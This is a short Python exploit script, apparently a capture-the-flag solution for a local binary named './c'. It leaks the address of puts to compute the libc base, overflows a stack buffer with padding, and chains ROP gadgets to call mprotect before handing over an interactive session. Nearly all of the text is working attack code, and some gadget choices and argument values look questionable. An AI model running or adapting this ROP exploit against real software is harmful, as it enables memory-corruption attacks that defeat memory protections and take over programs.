from kk import *
context(arch='amd64', os='linux')
p = process('./c')
elf = ELF('./c')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
GDB(p)
line = p.recvline()
m = re.search(b'0x[0-9a-fA-F]+', line)
puts = int(m.group(), 16)
print(hex(puts))

libc_base = puts - libc.symbols['puts']
print(hex(libc_base))

K = libcrop(elf,libc,libc_base)

payload = b'A' * (0xA+8) +  p64(K['pop_rdi']) + p64(0x400000) + p64(K['pop_rsi']) +p64(0xfffffffff000)
payload += p64(K['pop_rbx']) + p64(7) + p64(K['mprotect'])
p.sendline(payload)

p.interactive()